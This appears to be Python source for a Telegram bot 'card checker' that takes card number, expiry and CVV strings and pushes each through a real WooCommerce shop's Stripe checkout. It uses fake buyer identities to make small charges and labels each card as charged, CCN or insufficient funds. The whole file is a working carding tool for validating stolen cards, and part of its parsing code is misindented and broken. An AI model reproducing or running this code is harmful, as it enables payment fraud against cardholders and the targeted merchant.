import requests
import time
import json
import urllib3
import re

# Disable InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_str(string, start, end):
    try:
        return re.search(f'{start}(.*?){end}', string).group(1)
    except AttributeError:
        return None

def get_random_user_info():
    response = requests.get("https://randomuser.me/api?nat=gb", headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    })
    user_info = response.json()
    first_name = user_info['results'][0]['name']['first']
    last_name = user_info['results'][0]['name']['last']
    email = f"{first_name.lower()}{last_name.lower()}@gmail.com"
    return first_name, last_name, email

def check_nonsk3(cc_data):
    cc_data = cc_data.strip()
    card_number, exp_month, exp_year, cvc = cc_data.split("|")

    first_name, last_name, email = get_random_user_info()

    session = requests.Session()
    session.verify = False

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Step 1: Add to cart
    add_to_cart_url = "https://yiliexpressions.com/?wc-ajax=add_to_cart"
    add_to_cart_data = {
        "price": "5",
        "product_name": "Mini Heart",
        "product_sku": "",
        "product_id": "1690",
        "quantity": "1"
    }
    session.post(add_to_cart_url, headers=headers, data=add_to_cart_data)

    # Step 2: Checkout page
    checkout_url = "https://yiliexpressions.com/checkout/"
    checkout_response = session.get(checkout_url, headers=headers)
    checkout_nonce = get_str(checkout_response.text, 'name="woocommerce-process-checkout-nonce" value="', '"')

    # Step 3: Create payment method
    payment_method_url = "https://api.stripe.com/v1/payment_methods"
    payment_method_data = {
        "type": "card",
        "billing_details[name]": f"{first_name} {last_name}",
        "billing_details[address][line1]": "112 Street",
        "billing_details[address][state]": "NY",
        "billing_details[address][city]": "New York",
        "billing_details[address][postal_code]": "10010",
        "billing_details[address][country]": "US",
        "billing_details[email]": email,
        "billing_details[phone]": "5189410151",
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "1374a98a-e48d-453c-a4ef-d7642b315f613bdfcb",
        "muid": "f9ffe1df-e2a4-49c2-b600-eb7c6ca61ad1ae6502",
        "sid": "fa356375-f8f6-4769-a37c-30b99fc1f3623425dc",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/8f42a78e50; stripe-js-v3/8f42a78e50; split-card-element",
        "referrer": "https://yiliexpressions.com",
        "time_on_page": "44000",
        "key": "pk_live_51HP442GWWn7aXlGRHviywylRO4zh9jGXW2Hi1NZ4jrFQz0e7f0TGargqoQWBbUo7uIDjPh3bMfq0y4fptS2K3oIH00UsKSbfoq"
    }
    payment_method_response = session.post(payment_method_url, headers=headers, data=payment_method_data)
    payment_method_id = get_str(payment_method_response.text, '"id": "', '"')

    # Step 4: Checkout with payment method
    checkout_confirm_url = "https://yiliexpressions.com/?wc-ajax=checkout"
    checkout_confirm_data = {
        "billing_first_name": first_name,
        "billing_last_name": last_name,
        "billing_company": "",
        "billing_country": "US",
        "billing_address_1": "112 Street",
        "billing_address_2": "",
        "billing_city": "New York",
        "billing_state": "NY",
        "billing_postcode": "10010",
        "billing_phone": "5189410151",
        "billing_email": email,
        "account_password": "",
        "ship_to_different_address": "1",
        "shipping_first_name": "James",
        "shipping_last_name": "DE",
        "shipping_company": "",
        "shipping_country": "US",
        "shipping_address_1": "112 Street",
        "shipping_address_2": "",
        "shipping_city": "New York",
        "shipping_state": "NY",
        "shipping_postcode": "10010",
        "order_comments": "",
        "wc_order_attribution_type": "typein",
        "wc_order_attribution_url": "(none)",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_session_entry": "https://yiliexpressions.com/",
        "wc_order_attribution_session_start_time": "2024-01-30 20:58:36",
        "wc_order_attribution_session_pages": "10",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        "shipping_method[0]": "local_pickup:13",
        "payment_method": "stripe",
        "woocommerce-process-checkout-nonce": checkout_nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
        "stripe_source": payment_method_id
    }
    confirm_order_response = session.post(checkout_confirm_url, headers=headers, data=checkout_confirm_data)

    # Step 6: Parse response
status = get_str(confirm_order_response.text, '"result":"', '"')
msg = get_str(confirm_order_response.text, '\\"alert\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t<\\/ul>')

# Add logging to see the full response
print("Full response:", confirm_order_response.text)  # Log the full response for debugging

if status == "success":
    return "Charged Successfully 💳✅"
elif status == "failure":
    if msg:
        if "Your card's security code is incorrect" in msg:
            return "CCN ❌"
        elif "Your card has insufficient funds." in msg:
            return "NSF ❌"
        else:
            return f"Failed: {msg}"
    else:
        return f"Failed: {confirm_order_response.text}"  # Return full response if msg is None
else:
    return f"Unknown error ❌: {confirm_order_response.text}"  # Return full response if status is unknown

def handle_nonsk3_command(bot, message):
    chat_id = message.chat.id
    cc_data = message.text.split()[1:]  # Get the cc data from the command
    if cc_data:
        total_cards = len(cc_data)
        start_time = time.time()
        results = []
        initial_message = "↯ NONSK3 CHECKER\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))

        for card in cc_data:
            result = check_nonsk3(card)
            results.append(f"Card: {card}\nResponse => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide card details in the format: /nonsk3 card_number|exp_month|exp_year|cvv")

def get_footer_info(total_cards, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Cards Checked - {total_cards}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
